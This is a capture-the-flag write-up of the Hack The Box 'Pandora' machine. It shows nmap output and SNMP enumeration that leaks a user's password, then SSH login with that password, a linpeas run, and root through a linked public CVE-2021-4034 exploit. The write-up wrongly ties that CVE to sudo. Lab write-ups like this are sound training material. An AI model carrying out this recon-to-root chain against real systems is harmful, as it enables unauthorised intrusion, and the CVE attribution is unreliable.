Pandora HTB Writeup
---
From the decription of the machine, I pwned the box in an unintended way.

![logo](https://i.imgur.com/R2z087e.png)

1 Enumeration
---

nmap
~~~
┌──(wolf㉿piratesec)-[~/Htb/pandora]
└─$ sudo nmap --min-rate 20000 10.129.87.252 -oN nmap -v -sU -sS
[sudo] password for wolf:
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-07 07:40 EDT
Initiating Ping Scan at 07:40
Scanning 10.129.87.252 [4 ports]
Completed Ping Scan at 07:40, 0.20s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 07:40
Completed Parallel DNS resolution of 1 host. at 07:40, 0.06s elapsed
Initiating SYN Stealth Scan at 07:40
Scanning 10.129.87.252 [1000 ports]
Increasing send delay for 10.129.87.252 from 0 to 5 due to 97 out of 321 dropped probes since last increase.
Discovered open port 80/tcp on 10.129.87.252
Discovered open port 22/tcp on 10.129.87.252
Increasing send delay for 10.129.87.252 from 5 to 10 due to 196 out of 653 dropped probes since last increase.
Completed SYN Stealth Scan at 07:40, 0.72s elapsed (1000 total ports)
Initiating UDP Scan at 07:40
Scanning 10.129.87.252 [1000 ports]
Discovered open port 161/udp on 10.129.87.252
Completed UDP Scan at 07:40, 0.39s elapsed (1000 total ports)
Nmap scan report for 10.129.87.252
Host is up (0.16s latency).
Not shown: 998 closed tcp ports (reset), 6 closed udp ports (port-unreach), 993 open|filtered udp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
161/udp open  snmp

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.65 seconds
           Raw packets sent: 4138 (186.425KB) | Rcvd: 1009 (40.852KB)
~~~

I'm going to start with the low lying fruits: SNMP port 161.

## SNMP Port 161

Simple Network Management Protocol (SNMP) is an internet standard protocol used to monitor and manage Network devices connected over an IP.
Snmp can be a great place to look for information. I'm going to head over to metasploit to see if there are any exploits. SNMP can also be enumerated by **SNPMWALK**.

### SNMP Enumeration

I found this metasploit exploit to enumerate SNMP

![snmp](https://i.imgur.com/49uyQhZ.png)

Running it against the port I get creds for a user:daniel with pass:HotelBabylon23
~~~
976                 runnable            sh                  /bin/sh             -c sleep 30; /bin/bash -c '/usr/bin/host_check -u daniel -p HotelBabylon23'
981                 runnable            sshd                sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
1005                runnable            agetty              /sbin/agetty        -o -p -- \u --noclear tty1 linux
1041                runnable            mysqld              /usr/sbin/mysqld
1042                runnable            apache2             /usr/sbin/apache2   -k start
1043                runnable            apache2             /usr/sbin/apache2   -k start
1044                runnable            apache2             /usr/sbin/apache2   -k start
1045                runnable            apache2             /usr/sbin/apache2   -k start
1046                runnable            apache2             /usr/sbin/apache2   -k start
1047                runnable            apache2             /usr/sbin/apache2   -k start
1137                runnable            host_check          /usr/bin/host_check -u daniel -p HotelBabylon23
1178                runnable            apache2             /usr/sbin/apache2   -k start
1199                runnable            apache2             /usr/sbin/apache2   -k start
1200                runnable            apache2             /usr/sbin/apache2   -k start
1289                unknown             kworker/u4:0-events_power_efficient
1302                runnable            apache2             /usr/sbin/apache2   -k start
1353                runnable            apache2             /usr/sbin/apache2   -k start
1378                unknown             kworker/0:0-events
1455                unknown             kworker/u4:1-events_power_efficient
1457                unknown             kworker/0:1-cgroup_destroy
1459                unknown             kworker/1:0


[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/snmp/snmp_enum) >
~~~

2 Foothold
---

Using the creds I'm able to login into ssh..

~~~
┌──(wolf㉿piratesec)-[~/Htb/pandora]
└─$ ssh daniel@10.129.87.252
daniel@10.129.87.252's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue  7 Jun 08:52:40 UTC 2022

  System load:           0.02
  Usage of /:            63.0% of 4.87GB
  Memory usage:          8%
  Swap usage:            0%
  Processes:             224
  Users logged in:       1
  IPv4 address for eth0: 10.129.87.252
  IPv6 address for eth0: dead:beef::250:56ff:fe96:2577

  => /boot is using 91.8% of 219MB


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Tue Jun  7 08:51:30 2022 from 10.10.16.14
daniel@pandora:~$
~~~

Looking around the daniel's directory I find nothing. Daniel can't execute sudo commands.

![daniel](https://i.imgur.com/gNelaUc.png)

I then head over to home and find another user Matt. Inside Matt's directory is a user.txt but I can't read it: permission denied.

![perm](https://i.imgur.com/4aoQLoP.png)


3 Privesc
---

Time for Linpeas. I start a python server on my local machine and download linpeas on the compromised machine. It seems the sudo version is vulnerable to  CVE-2021-4034.

![linpeas](https://i.imgur.com/nzLdnpP.png)

Looking around the web I found a [python exploit](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py) to exploit the vulnerability.

Running it on the machine I get root..

![root](https://i.imgur.com/gkIYYTC.png)

@wolf
